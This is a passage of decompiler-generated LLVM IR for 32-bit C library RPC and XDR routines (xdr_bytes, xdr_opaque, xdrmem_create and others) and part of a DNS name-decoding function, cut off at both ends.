  %v1_806469e = call i32 @__rpc_thread_variables(i32 %v0_806469e)
  %v0_80646a3 = load i32, i32* @esi, align 4
  %v2_80646a3 = add i32 %v1_806469e, 184
  %v3_80646a3 = inttoptr i32 %v2_80646a3 to i32*
  store i32 %v0_80646a3, i32* %v3_80646a3, align 4
  br label %dec_label_pc_80646ad

dec_label_pc_80646ab:                             ; preds = %dec_label_pc_8064694
  %v2_80646ab = inttoptr i32 %v3_8064694 to i32*
  store i32 %v2_8064698, i32* %v2_80646ab, align 4
  br label %dec_label_pc_80646ad

dec_label_pc_80646ad:                             ; preds = %dec_label_pc_806469e, %dec_label_pc_80646ab
  %v0_80646b0 = load i32, i32* @ebx, align 4
  %v1_80646b0 = inttoptr i32 %v0_80646b0 to i32*
  store i32 0, i32* %v1_80646b0, align 4
  %v0_80646b6 = load i32, i32* @ebx, align 4
  %v1_80646b7 = call i32 @free(i32 %v0_80646b6)
  %v0_80646be = load i32, i32* @edi, align 4
  %v1_80646c0 = call i32 @__GI_pmap_unset(i32 %v0_80646be)
  br label %dec_label_pc_80646c8

dec_label_pc_80646c8:                             ; preds = %entry.dec_label_pc_80646c8_crit_edge, %dec_label_pc_80646ad
  %v0_80646cf = phi i32 [ 0, %entry.dec_label_pc_80646c8_crit_edge ], [ %v1_80646c0, %dec_label_pc_80646ad ]
  %v2_80646cb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80646cb, i32* @ebx, align 4
  store i32 %v0_8064674, i32* @esi, align 4
  store i32 %v0_8064673, i32* @edi, align 4
  store i32 %v0_8064672, i32* @ebp, align 4
  ret i32 %v0_80646cf

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80646c8, { 1, 0 }
  uselistorder label %dec_label_pc_80646ad, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  br label %dec_label_pc_80646e5

dec_label_pc_80646d5:                             ; preds = %dec_label_pc_80646e5
  %v0_80646d5 = load i32, i32* @ecx, align 4
  %v1_80646d7 = add i32 %v3_80646ea, 8
  %v2_80646d7 = inttoptr i32 %v1_80646d7 to i32*
  %v3_80646d7 = load i32, i32* %v2_80646d7, align 4
  %v1_80646da = add i32 %v3_80646ea, 4
  %v2_80646da = inttoptr i32 %v1_80646da to i32*
  %v3_80646da = load i32, i32* %v2_80646da, align 4
  %v4_80646dd = call i32 @svc_unregister(i32 %v3_80646da, i32 %v3_80646d7, i32 %v0_80646d5, i32 %v0_80646d5)
  br label %dec_label_pc_80646e5

dec_label_pc_80646e5:                             ; preds = %entry, %dec_label_pc_80646d5
  %v0_80646e5 = phi i32 [ %v3_80646da, %dec_label_pc_80646d5 ], [ %tmp7, %entry ]
  %v1_80646e5 = call i32 @__rpc_thread_variables(i32 %v0_80646e5)
  %v1_80646ea = add i32 %v1_80646e5, 184
  %v2_80646ea = inttoptr i32 %v1_80646ea to i32*
  %v3_80646ea = load i32, i32* %v2_80646ea, align 4
  %v1_80646f0 = icmp eq i32 %v3_80646ea, 0
  %v1_80646f2 = icmp eq i1 %v1_80646f0, false
  br i1 %v1_80646f2, label %dec_label_pc_80646d5, label %dec_label_pc_80646f4

dec_label_pc_80646f4:                             ; preds = %dec_label_pc_80646e5
  ret i32 %v3_80646ea

; uselistorder directives
  uselistorder i32 %v3_80646ea, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80646e5, { 1, 0 }
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_8064b4e = inttoptr i32 %tmp2 to i32*
  %v2_8064b4e = load i32, i32* %v1_8064b4e, align 4
  store i32 %v2_8064b4e, i32* %eax.global-to-local, align 4
  %v1_8064b50 = icmp eq i32 %v2_8064b4e, 0
  %v1_8064b52 = icmp eq i1 %v1_8064b50, false
  br i1 %v1_8064b52, label %dec_label_pc_8064b5c, label %dec_label_pc_8064b54

dec_label_pc_8064b54:                             ; preds = %entry
  %v1_8064b54 = add i32 %tmp2, 4
  %v2_8064b54 = inttoptr i32 %v1_8064b54 to i32*
  %v3_8064b54 = load i32, i32* %v2_8064b54, align 4
  store i32 %v3_8064b54, i32* %eax.global-to-local, align 4
  %v1_8064b57 = add i32 %v3_8064b54, 4
  br label %dec_label_pc_8064b6e

dec_label_pc_8064b5c:                             ; preds = %entry
  %v9_8064b5c = icmp eq i32 %v2_8064b4e, 1
  %v1_8064b5f = icmp eq i1 %v9_8064b5c, false
  br i1 %v1_8064b5f, label %dec_label_pc_8064b70, label %dec_label_pc_8064b61

dec_label_pc_8064b61:                             ; preds = %dec_label_pc_8064b5c
  %v1_8064b61 = add i32 %tmp2, 4
  %v2_8064b61 = inttoptr i32 %v1_8064b61 to i32*
  %v3_8064b61 = load i32, i32* %v2_8064b61, align 4
  store i32 %v3_8064b61, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064b6e

dec_label_pc_8064b6e:                             ; preds = %dec_label_pc_8064b54, %dec_label_pc_8064b61
  %storemerge.in.in = phi i32 [ %v1_8064b57, %dec_label_pc_8064b54 ], [ %v3_8064b61, %dec_label_pc_8064b61 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %storemerge)
  %v0_8064b70.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064b70

dec_label_pc_8064b70:                             ; preds = %dec_label_pc_8064b5c, %dec_label_pc_8064b6e
  %v0_8064b70 = phi i32 [ %v2_8064b4e, %dec_label_pc_8064b5c ], [ %v0_8064b70.pre, %dec_label_pc_8064b6e ]
  %v9_8064b70 = icmp eq i32 %v0_8064b70, 2
  %v1_8064b73 = zext i1 %v9_8064b70 to i32
  store i32 %v1_8064b73, i32* %eax.global-to-local, align 4
  ret i32 %v1_8064b73

; uselistorder directives
  uselistorder i32 %v2_8064b4e, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_8064b70, { 1, 0 }
  uselistorder label %dec_label_pc_8064b6e, { 1, 0 }
}

define i32 @xdr_u_long(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %tmp6, i32* @ecx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8064bef = load i32, i32* %arg1, align 4
  %v9_8064bf1 = icmp eq i32 %v2_8064bef, 1
  br i1 %v9_8064bf1, label %dec_label_pc_8064c04, label %dec_label_pc_8064bf6

dec_label_pc_8064bf6:                             ; preds = %entry
  %v5_8064bf1 = icmp eq i32 %v2_8064bef, 0
  br i1 %v5_8064bf1, label %dec_label_pc_8064c25, label %dec_label_pc_8064bf8

dec_label_pc_8064bf8:                             ; preds = %dec_label_pc_8064bf6
  %v9_8064bf8 = icmp eq i32 %v2_8064bef, 2
  br i1 %v9_8064bf8, label %dec_label_pc_8064c36, label %dec_label_pc_8064c34

dec_label_pc_8064c04:                             ; preds = %entry
  %v1_8064c06 = add i32 %tmp6, 4
  %v2_8064c06 = inttoptr i32 %v1_8064c06 to i32*
  %v3_8064c06 = load i32, i32* %v2_8064c06, align 4
  %v5_8064c0f = inttoptr i32 %v3_8064c06 to i32*
  %v6_8064c0f = load i32, i32* %v5_8064c0f, align 4
  call void @__pseudo_call(i32 %v6_8064c0f)
  %v1_8064c14 = icmp eq i32 %v3_8064c06, 0
  br i1 %v1_8064c14, label %dec_label_pc_8064c34, label %dec_label_pc_8064c18

dec_label_pc_8064c18:                             ; preds = %dec_label_pc_8064c04
  %v1_8064c1c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064c1c = inttoptr i32 %v1_8064c1c to i32*
  br label %dec_label_pc_8064c36

dec_label_pc_8064c25:                             ; preds = %dec_label_pc_8064bf6
  %v1_8064c27 = add i32 %tmp6, 4
  %v2_8064c27 = inttoptr i32 %v1_8064c27 to i32*
  %v3_8064c27 = load i32, i32* %v2_8064c27, align 4
  %v5_8064c2c = add i32 %v3_8064c27, 4
  %v6_8064c2c = inttoptr i32 %v5_8064c2c to i32*
  %v7_8064c2c = load i32, i32* %v6_8064c2c, align 4
  call void @__pseudo_call(i32 %v7_8064c2c)
  br label %dec_label_pc_8064c36

dec_label_pc_8064c34:                             ; preds = %dec_label_pc_8064bf8, %dec_label_pc_8064c04
  br label %dec_label_pc_8064c36

dec_label_pc_8064c36:                             ; preds = %dec_label_pc_8064bf8, %dec_label_pc_8064c25, %dec_label_pc_8064c18, %dec_label_pc_8064c34
  %v0_8064c3a = phi i32 [ 1, %dec_label_pc_8064bf8 ], [ %v3_8064c27, %dec_label_pc_8064c25 ], [ 1, %dec_label_pc_8064c18 ], [ 0, %dec_label_pc_8064c34 ]
  %v2_8064c39 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8064c39, i32* @ebx, align 4
  ret i32 %v0_8064c3a

; uselistorder directives
  uselistorder i32 %v2_8064bef, { 0, 2, 1 }
  uselistorder i32 %tmp6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8064c36, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8064c34, { 1, 0 }
}

define i32 @xdr_enum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8064eee = call i32 @__GI_xdr_long()
  ret i32 %v0_8064eee
}

define i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8064ef4 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_8064f04 = icmp eq i32 %tmp, 0
  br i1 %v1_8064f04, label %dec_label_pc_8064f8d, label %dec_label_pc_8064f08

dec_label_pc_8064f08:                             ; preds = %entry
  %v1_8064f0c = urem i32 %tmp, 4
  %v2_8064f0c = icmp eq i32 %v1_8064f0c, 0
  br i1 %v2_8064f0c, label %dec_label_pc_8064f17, label %dec_label_pc_8064f11

dec_label_pc_8064f11:                             ; preds = %dec_label_pc_8064f08
  %v2_8064f15 = sub nsw i32 4, %v1_8064f0c
  br label %dec_label_pc_8064f17

dec_label_pc_8064f17:                             ; preds = %dec_label_pc_8064f08, %dec_label_pc_8064f11
  %storemerge13 = phi i32 [ %v2_8064f15, %dec_label_pc_8064f11 ], [ 0, %dec_label_pc_8064f08 ]
  store i32 %storemerge13, i32* %esi.global-to-local, align 4
  %v1_8064f17 = inttoptr i32 %arg2 to i32*
  %v2_8064f17 = load i32, i32* %v1_8064f17, align 4
  %v9_8064f19 = icmp eq i32 %v2_8064f17, 1
  br i1 %v9_8064f19, label %dec_label_pc_8064f27, label %dec_label_pc_8064f1e

dec_label_pc_8064f1e:                             ; preds = %dec_label_pc_8064f17
  %v5_8064f19 = icmp eq i32 %v2_8064f17, 0
  br i1 %v5_8064f19, label %dec_label_pc_8064f54, label %dec_label_pc_8064f20

dec_label_pc_8064f20:                             ; preds = %dec_label_pc_8064f1e
  %v9_8064f20 = icmp eq i32 %v2_8064f17, 2
  %v1_8064f23 = icmp eq i1 %v9_8064f20, false
  br i1 %v1_8064f23, label %dec_label_pc_8064f8b, label %dec_label_pc_8064f8d

dec_label_pc_8064f27:                             ; preds = %dec_label_pc_8064f17
  %v1_8064f28 = add i32 %arg2, 4
  %v2_8064f28 = inttoptr i32 %v1_8064f28 to i32*
  %v3_8064f28 = load i32, i32* %v2_8064f28, align 4
  %v5_8064f2e = add i32 %v3_8064f28, 8
  %v6_8064f2e = inttoptr i32 %v5_8064f2e to i32*
  %v7_8064f2e = load i32, i32* %v6_8064f2e, align 4
  call void @__pseudo_call(i32 %v7_8064f2e)
  %v1_8064f34 = icmp eq i32 %v3_8064f28, 0
  br i1 %v1_8064f34, label %dec_label_pc_8064f8b, label %dec_label_pc_8064f38

dec_label_pc_8064f38:                             ; preds = %dec_label_pc_8064f27
  %v0_8064f38 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064f38 = icmp eq i32 %v0_8064f38, 0
  br i1 %v1_8064f38, label %dec_label_pc_8064f8d, label %dec_label_pc_8064f3c

dec_label_pc_8064f3c:                             ; preds = %dec_label_pc_8064f38
  %v0_8064f3c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064f3c = add i32 %v0_8064f3c, 4
  %v2_8064f3c = inttoptr i32 %v1_8064f3c to i32*
  %v3_8064f3c = load i32, i32* %v2_8064f3c, align 4
  %v1_8064f4f = add i32 %v3_8064f3c, 8
  br label %dec_label_pc_8064f7f

dec_label_pc_8064f54:                             ; preds = %dec_label_pc_8064f1e
  %v1_8064f55 = add i32 %arg2, 4
  %v2_8064f55 = inttoptr i32 %v1_8064f55 to i32*
  %v3_8064f55 = load i32, i32* %v2_8064f55, align 4
  %v5_8064f5b = add i32 %v3_8064f55, 12
  %v6_8064f5b = inttoptr i32 %v5_8064f5b to i32*
  %v7_8064f5b = load i32, i32* %v6_8064f5b, align 4
  call void @__pseudo_call(i32 %v7_8064f5b)
  %v1_8064f61 = icmp eq i32 %v3_8064f55, 0
  br i1 %v1_8064f61, label %dec_label_pc_8064f8b, label %dec_label_pc_8064f65

dec_label_pc_8064f65:                             ; preds = %dec_label_pc_8064f54
  %v0_8064f65 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064f65 = icmp eq i32 %v0_8064f65, 0
  br i1 %v1_8064f65, label %dec_label_pc_8064f8d, label %dec_label_pc_8064f69

dec_label_pc_8064f69:                             ; preds = %dec_label_pc_8064f65
  %v0_8064f69 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064f69 = add i32 %v0_8064f69, 4
  %v2_8064f69 = inttoptr i32 %v1_8064f69 to i32*
  %v3_8064f69 = load i32, i32* %v2_8064f69, align 4
  %v1_8064f7c = add i32 %v3_8064f69, 12
  br label %dec_label_pc_8064f7f

dec_label_pc_8064f7f:                             ; preds = %dec_label_pc_8064f3c, %dec_label_pc_8064f69
  %stack_var_0.0 = phi i32 [ %v0_8064f3c, %dec_label_pc_8064f3c ], [ %v0_8064f69, %dec_label_pc_8064f69 ]
  %storemerge1.in.in = phi i32 [ %v1_8064f4f, %dec_label_pc_8064f3c ], [ %v1_8064f7c, %dec_label_pc_8064f69 ]
  %stack_var_4.0 = phi i32 [ ptrtoint (i32* @global_var_807d9fc.827 to i32), %dec_label_pc_8064f3c ], [ ptrtoint (i32* @global_var_806f4fd.828 to i32), %dec_label_pc_8064f69 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  store i32 %storemerge1, i32* @ecx, align 4
  %v2_8064f80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8064f80, i32* %ebx.global-to-local, align 4
  store i32 %v0_8064ef4, i32* %esi.global-to-local, align 4
  call void @__pseudo_branch(i32 %storemerge1)
  br label %dec_label_pc_8064f8d

dec_label_pc_8064f8b:                             ; preds = %dec_label_pc_8064f54, %dec_label_pc_8064f27, %dec_label_pc_8064f20
  br label %dec_label_pc_8064f8d

dec_label_pc_8064f8d:                             ; preds = %dec_label_pc_8064f7f, %entry, %dec_label_pc_8064f38, %dec_label_pc_8064f65, %dec_label_pc_8064f20, %dec_label_pc_8064f8b
  %stack_var_0.1 = phi i32 [ %arg1, %entry ], [ %arg1, %dec_label_pc_8064f8b ], [ %arg1, %dec_label_pc_8064f38 ], [ %stack_var_0.0, %dec_label_pc_8064f7f ], [ %arg1, %dec_label_pc_8064f65 ], [ %arg1, %dec_label_pc_8064f20 ]
  %stack_var_4.1 = phi i32 [ %arg2, %entry ], [ %arg2, %dec_label_pc_8064f8b ], [ %arg2, %dec_label_pc_8064f38 ], [ %stack_var_4.0, %dec_label_pc_8064f7f ], [ %arg2, %dec_label_pc_8064f65 ], [ %arg2, %dec_label_pc_8064f20 ]
  %storemerge = phi i32 [ 1, %entry ], [ 0, %dec_label_pc_8064f8b ], [ 1, %dec_label_pc_8064f38 ], [ 1, %dec_label_pc_8064f7f ], [ 1, %dec_label_pc_8064f65 ], [ 1, %dec_label_pc_8064f20 ]
  store i32 %stack_var_0.1, i32* @ebx, align 4
  store i32 %stack_var_4.1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8064f17, { 0, 2, 1 }
  uselistorder i32 %v1_8064f0c, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder label %dec_label_pc_8064f8d, { 5, 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_8064f7f, { 1, 0 }
  uselistorder label %dec_label_pc_8064f17, { 1, 0 }
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_806510f = load i32, i32* @ebp, align 4
  %v0_8065110 = load i32, i32* @edi, align 4
  %v0_8065111 = load i32, i32* @esi, align 4
  %v0_8065112 = load i32, i32* @ebx, align 4
  store i32 %v0_8065112, i32* %stack_var_-16, align 4
  store i32 %arg4, i32* @eax, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %tmp11, i32* @edi, align 4
  %v7_806512f = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  store i32 %v7_806512f, i32* %eax.global-to-local, align 4
  %v1_8065137 = icmp eq i32 %v7_806512f, 0
  br i1 %v1_8065137, label %dec_label_pc_80651c5, label %dec_label_pc_806513f

dec_label_pc_806513f:                             ; preds = %entry
  %v0_806513f = load i32, i32* %esi.global-to-local, align 4
  %v1_806513f = inttoptr i32 %v0_806513f to i32*
  %v2_806513f = load i32, i32* %v1_806513f, align 4
  store i32 %v2_806513f, i32* @esi, align 4
  %tmp = icmp ugt i32 %v2_806513f, %arg4
  %v0_806514c.pre = load i32, i32* @edi, align 4
  %v1_806514c.phi.trans.insert = inttoptr i32 %v0_806514c.pre to i32*
  %v2_806514c.pre = load i32, i32* %v1_806514c.phi.trans.insert, align 4
  br i1 %tmp, label %dec_label_pc_8065147, label %dec_label_pc_806514c

dec_label_pc_8065147:                             ; preds = %dec_label_pc_806513f
  %v11_8065147 = icmp eq i32 %v2_806514c.pre, 2
  %v1_806514a = icmp eq i1 %v11_8065147, false
  br i1 %v1_806514a, label %dec_label_pc_80651c5, label %dec_label_pc_806514c

dec_label_pc_806514c:                             ; preds = %dec_label_pc_806513f, %dec_label_pc_8065147
  store i32 %v2_806514c.pre, i32* %eax.global-to-local, align 4
  %v9_806514e = icmp eq i32 %v2_806514c.pre, 1
  br i1 %v9_806514e, label %dec_label_pc_806515c, label %dec_label_pc_8065153

dec_label_pc_8065153:                             ; preds = %dec_label_pc_806514c
  %v5_806514e = icmp eq i32 %v2_806514c.pre, 0
  br i1 %v5_806514e, label %dec_label_pc_806518f, label %dec_label_pc_8065155

dec_label_pc_8065155:                             ; preds = %dec_label_pc_8065153
  %v9_8065155 = icmp eq i32 %v2_806514c.pre, 2
  %v1_8065158 = icmp eq i1 %v9_8065155, false
  br i1 %v1_8065158, label %dec_label_pc_80651c5, label %dec_label_pc_80651a7

dec_label_pc_806515c:                             ; preds = %dec_label_pc_806514c
  %v1_806515c = icmp eq i32 %v2_806513f, 0
  br i1 %v1_806515c, label %dec_label_pc_80651c9, label %dec_label_pc_8065160

dec_label_pc_8065160:                             ; preds = %dec_label_pc_806515c
  %v0_8065160 = load i32, i32* @ebx, align 4
  %v1_8065160 = icmp eq i32 %v0_8065160, 0
  %v1_8065162 = icmp eq i1 %v1_8065160, false
  br i1 %v1_8065162, label %dec_label_pc_806518f, label %dec_label_pc_8065164

dec_label_pc_8065164:                             ; preds = %dec_label_pc_8065160
  %v2_8065168 = call i32 @malloc(i32 %v2_806513f)
  store i32 %v2_8065168, i32* %eax.global-to-local, align 4
  %v1_8065170 = icmp eq i32 %v2_8065168, 0
  store i32 %v2_8065168, i32* @ebx, align 4
  %v1_8065174 = load i32, i32* @ebp, align 4
  %v2_8065174 = inttoptr i32 %v1_8065174 to i32*
  store i32 %v2_8065168, i32* %v2_8065174, align 4
  %v1_8065177 = icmp eq i1 %v1_8065170, false
  br i1 %v1_8065177, label %dec_label_pc_8065164.dec_label_pc_806518f_crit_edge, label %dec_label_pc_8065179

dec_label_pc_8065164.dec_label_pc_806518f_crit_edge: ; preds = %dec_label_pc_8065164
  %v0_8065197.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_806518f

dec_label_pc_8065179:                             ; preds = %dec_label_pc_8065164
  %v0_806517b1 = load i32, i32* bitcast (i8** @global_var_8074d70 to i32*), align 4
  %v4_8065186 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_806f4e3.830 to i32), i32 %v0_806517b1)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80651c0

dec_label_pc_806518f:                             ; preds = %dec_label_pc_8065164.dec_label_pc_806518f_crit_edge, %dec_label_pc_8065160, %dec_label_pc_8065153
  %v0_8065197 = phi i32 [ %v0_8065197.pre, %dec_label_pc_8065164.dec_label_pc_806518f_crit_edge ], [ %v0_806514c.pre, %dec_label_pc_8065160 ], [ %v0_806514c.pre, %dec_label_pc_8065153 ]
  %v0_8065193 = load i32, i32* @ebx, align 4
  %v2_806519e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806519e, i32* @ebx, align 4
  store i32 %v0_8065111, i32* @esi, align 4
  store i32 %v0_8065110, i32* @edi, align 4
  store i32 %v0_806510f, i32* @ebp, align 4
  %v3_80651a2 = call i32 @xdr_opaque(i32 %v0_8065197, i32 %v0_8065193, i32 %v2_806513f)
  store i32 %v3_80651a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80651a7

dec_label_pc_80651a7:                             ; preds = %dec_label_pc_8065155, %dec_label_pc_806518f
  %v0_80651a7 = load i32, i32* @ebx, align 4
  %v1_80651a7 = icmp eq i32 %v0_80651a7, 0
  br i1 %v1_80651a7, label %dec_label_pc_80651c9, label %dec_label_pc_80651ab

dec_label_pc_80651ab:                             ; preds = %dec_label_pc_80651a7
  %v2_80651af = call i32 @free(i32 %v0_80651a7)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_80651b9 = load i32, i32* @ebp, align 4
  %v1_80651b9 = inttoptr i32 %v0_80651b9 to i32*
  store i32 0, i32* %v1_80651b9, align 4
  %v0_80651d5.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80651c0

dec_label_pc_80651c0:                             ; preds = %dec_label_pc_8065179, %dec_label_pc_80651ab
  %v0_80651d5.pre = phi i32 [ 0, %dec_label_pc_8065179 ], [ %v0_80651d5.pre.pre, %dec_label_pc_80651ab ]
  br label %dec_label_pc_80651ce

dec_label_pc_80651c5:                             ; preds = %dec_label_pc_8065155, %dec_label_pc_8065147, %entry
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80651ce

dec_label_pc_80651c9:                             ; preds = %dec_label_pc_80651a7, %dec_label_pc_806515c
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80651ce

dec_label_pc_80651ce:                             ; preds = %dec_label_pc_80651c5, %dec_label_pc_80651c0, %dec_label_pc_80651c9
  %v0_80651d5 = phi i32 [ 0, %dec_label_pc_80651c5 ], [ %v0_80651d5.pre, %dec_label_pc_80651c0 ], [ 1, %dec_label_pc_80651c9 ]
  store i32 %v0_8065111, i32* %esi.global-to-local, align 4
  store i32 %v0_8065110, i32* @edi, align 4
  store i32 %v0_806510f, i32* @ebp, align 4
  ret i32 %v0_80651d5

; uselistorder directives
  uselistorder i32 %v2_8065168, { 1, 0, 2, 3 }
  uselistorder i32 %v2_806514c.pre, { 0, 3, 1, 4, 2 }
  uselistorder i32 %v0_806514c.pre, { 1, 0, 2 }
  uselistorder i32 %v2_806513f, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8065111, { 1, 0 }
  uselistorder i32 %v0_8065110, { 1, 0 }
  uselistorder i32 %v0_806510f, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32)* @__GI_fputs, { 1, 0 }
  uselistorder i32 (i32*, i32)* @xdr_u_long, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80651ce, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80651c0, { 1, 0 }
  uselistorder label %dec_label_pc_80651a7, { 1, 0 }
  uselistorder label %dec_label_pc_806514c, { 1, 0 }
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %arg1, align 4
  %v1_8065202 = add i32 %tmp3, 4
  %v2_8065202 = inttoptr i32 %v1_8065202 to i32*
  store i32 ptrtoint (i32* @global_var_806f520.831 to i32), i32* %v2_8065202, align 4
  %v0_8065209 = load i32, i32* @ecx, align 4
  %v1_8065209 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065209 = add i32 %v1_8065209, 16
  %v3_8065209 = inttoptr i32 %v2_8065209 to i32*
  store i32 %v0_8065209, i32* %v3_8065209, align 4
  %v0_806520c = load i32, i32* @ecx, align 4
  %v1_806520c = load i32, i32* %edx.global-to-local, align 4
  %v2_806520c = add i32 %v1_806520c, 12
  %v3_806520c = inttoptr i32 %v2_806520c to i32*
  store i32 %v0_806520c, i32* %v3_806520c, align 4
  %v1_8065213 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065213 = add i32 %v1_8065213, 20
  %v3_8065213 = inttoptr i32 %v2_8065213 to i32*
  store i32 %arg3, i32* %v3_8065213, align 4
  ret i32 %arg3

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8065b4a = load i32, i32* @esi, align 4
  %v4_8065b4f = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_8065b4f, label %dec_label_pc_8065c16, label %dec_label_pc_8065b5e

dec_label_pc_8065b5e:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_8065bfe2541 = add i32 %arg2, %arg1
  %v3_8065bfe2642 = inttoptr i32 %v2_8065bfe2541 to i8*
  %v4_8065bfe2743 = load i8, i8* %v3_8065bfe2642, align 1
  %v1_8065c022945 = icmp eq i8 %v4_8065bfe2743, 0
  %v1_8065c043046 = icmp eq i1 %v1_8065c022945, false
  br i1 %v1_8065c043046, label %dec_label_pc_8065b6c.lr.ph, label %dec_label_pc_8065c0a.thread65

dec_label_pc_8065c0a.thread65:                    ; preds = %dec_label_pc_8065b5e
  br label %bb67

dec_label_pc_8065b6c:                             ; preds = %dec_label_pc_8065b6c.lr.ph, %dec_label_pc_8065b85
  %v0_8065b76 = phi i32 [ %v0_8065b76.pre, %dec_label_pc_8065b6c.lr.ph ], [ %v4_8065b96, %dec_label_pc_8065b85 ]
  %v8_8065b6c37 = phi i1 [ %v8_8065b6c3151, %dec_label_pc_8065b6c.lr.ph ], [ true, %dec_label_pc_8065b85 ]
  %v5_8065bfe36.in = phi i8 [ %v5_8065bfe2850.in, %dec_label_pc_8065b6c.lr.ph ], [ %v4_8065bfe, %dec_label_pc_8065b85 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8065b6c.lr.ph ], [ 0, %dec_label_pc_8065b85 ]
  %v0_8065b7334 = phi i32 [ %v0_8065b73.ph47, %dec_label_pc_8065b6c.lr.ph ], [ %v2_8065ba4, %dec_label_pc_8065b85 ]
  %v5_8065bfe36 = zext i8 %v5_8065bfe36.in to i32
  %v1_8065b73 = add i32 %v0_8065b7334, 1
  store i32 %v1_8065b73, i32* @esi, align 4
  %v3_8065b76 = select i1 %v8_8065b6c37, i32 2, i32 1
  %v4_8065b76 = add i32 %v3_8065b76, %v0_8065b76
  store i32 %v4_8065b76, i32* %ebp.global-to-local, align 4
  %v1_8065b79 = and i32 %v5_8065bfe36, 192
  %v6_8065b7e = icmp eq i32 %v1_8065b79, 192
  %v1_8065b83 = icmp eq i1 %v6_8065b7e, false
  br i1 %v1_8065b83, label %dec_label_pc_8065ba8, label %dec_label_pc_8065b85

dec_label_pc_8065b85:                             ; preds = %dec_label_pc_8065b6c
  %v2_8065b92 = add i32 %v1_8065b73, %arg1
  %v3_8065b92 = inttoptr i32 %v2_8065b92 to i8*
  %v4_8065b92 = load i8, i8* %v3_8065b92, align 1
  %v5_8065b92 = zext i8 %v4_8065b92 to i32
